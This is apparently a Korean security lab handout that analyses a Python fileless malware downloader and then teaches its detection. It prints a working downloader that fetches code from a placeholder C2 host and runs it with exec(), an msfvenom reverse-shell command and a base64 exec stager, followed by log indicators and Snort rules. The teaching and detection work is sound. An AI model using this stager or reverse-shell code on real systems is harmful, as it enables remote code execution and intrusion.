
# [실습] 061. 악성코드 다운로더 소스코드 분석 및 탐지 실습

## 1. 실습 개요: 다운로더(Stager) 메커니즘 이해

다운로더는 초기 침투를 위한 '스테이저(Stager)' 역할을 수행하며, 시스템에 추가적인 악성 페이로드(Stage)를 설치하기 위해 작동합니다 [1, 2]. 본 실습에서는 디스크에 파일을 남기지 않고 메모리에서 직접 코드를 로드해 실행(`exec`)하는 파이썬 기반 파일리스 다운로더 소스코드를 분석합니다 [3, 4].

---

## 2. [소스코드 실습 1] 파이썬 기반 파일리스 다운로더 분석

최근 다운로더는 탐지를 피하기 위해 메모리 직접 실행 기법을 선호합니다. 아래는 2단계 공격 시퀀스를 수행하는 대표적인 파이썬 다운로더의 소스코드입니다 [4].

```python
import urllib.request
import time
import sys


# [Phase 1] 안티 샌드박스 (Anti-Analysis): 시간 지연 기법 우회
time.sleep(10)


# [Phase 2] 명령제어(C2) 서버 URL 설정
c2_url = "http://malicious-c2-server.com/payload.py"


# [Phase 3] User-Agent 조작 및 정상 트래픽 위장
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}


try:
    # 네트워크 통신: C2 서버에 2차 페이로드 요청
    req = urllib.request.Request(c2_url, headers=headers)
    with urllib.request.urlopen(req) as response:
        payload = response.read().decode('utf-8')


    # [Phase 4] 파일리스(Fileless) 직접 실행 (Execution)
    # 디스크에 파일을 쓰지 않고 메모리 상에서 즉시 실행
    exec(payload)


except Exception as e:
    sys.exit(0)
3. 소스코드 실습 2 메타스플로잇(Metasploit) 스테이저 생성 및 코드 분석
칼리 리눅스의 msfvenom을 활용하면 보안 시스템의 정적 문자열 스캔을 우회하기 위해, 스크립트 본문 전체를 Base64로 인코딩하여 배포하는 다운로더를 손쉽게 생성할 수 있습니다 3.
3.1 메타스플로잇 페이로드 생성 명령행 (CLI)
# msfvenom을 이용해 Base64로 인코딩된 파이썬 리버스 쉘 페이로드 생성
$ msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o stager.py
3.2 생성된 스테이저(stager.py) 소스코드 분석
import base64
import urllib.request
import time
import sys


time.sleep(10)


# C2 서버로부터 수신한 페이로드 (실제 msfvenom 생성 시 엄청난 길이의 Base64 난독화 코드가 삽입됨)
encoded_payload = b"aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZSxvcwpzPXNvY2tldC5zb2NrZXQo... (생략)"


try:
    # 암호화된 페이로드를 원본으로 복호화한 후, 디스크에 쓰지 않고 메모리 상에서 즉시 실행
    exec(base64.b64decode(encoded_payload).decode('utf-8'))


except Exception as e:
    sys.exit(0)
4. 탐지 실습 1 시스템 로그 기반 침해 흔적(IoC) 추적
위 소스코드가 실행될 경우 관제 시스템(SIEM/EDR)에서 탐지해야 할 호스트 및 네트워크 계층의 핵심 지표는 다음과 같습니다.
호스트 계층 - 프로세스 트리 (Event ID 4688): python.exe 프로세스가 백그라운드로 띄워지며 exec() 함수에 의해 cmd.exe나 powershell.exe를 자식 프로세스로 연계 호출하는 징후 포착 5, 6.
호스트 계층 - 디스크 쓰기 부재 (Event ID 11): 외부 네트워크 세션이 연결되었음에도 시스템 템프(%TEMP%) 경로에 CreateFile 이벤트가 포착되지 않는 메모리 실행 징후 확인 5, 6.
네트워크 계층 - HTTP 헤더 불일치: urllib 사용으로 인해 실제 크롬 브라우저가 전송해야 할 Accept-Language 등의 필수 헤더가 누락되는 Anomaly 징후 포착 5, 6.
5. 탐지 실습 2 Snort 기반 네트워크 방어 룰(Rule) 작성
네트워크 단에서 메타스플로잇 스테이저의 통신 패턴을 식별하고 차단하기 위한 IDS 탐지 룰을 작성합니다 7.
# [Rule 1] HTTP 헤더 불일치(Anomaly) 기반 탐지 (필수 헤더 누락을 통한 스크립트 봇 식별)
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (
    msg:"[Detect] HTTP User-Agent Anomaly (Possible Python Stager)";
    flow:established,to_server;
    content:"GET"; http_method;
    content:"User-Agent|3a| Mozilla/5.0"; http_header;
    pcre:"/User-Agent\x3a\x20Mozilla\/5\.0/H";
    content:!"Accept-Language|3a|"; http_header; 
    classtype:trojan-activity; 
    sid:1000011; rev:1;
)


# [Rule 2] Base64 인코딩된 Python 파일리스 exec() 패턴 탐지
alert tcp $EXTERNAL_NET any -> $HOME_NET any (
    msg:"[Detect] Python Fileless Stager Execution Pattern (exec/base64)"; 
    flow:established,to_client; 
    content:"import base64"; 
    content:"exec(base64.b64decode("; distance:0; within:100;
    classtype:attempted-admin; 
    sid:1000012; rev:1;
)
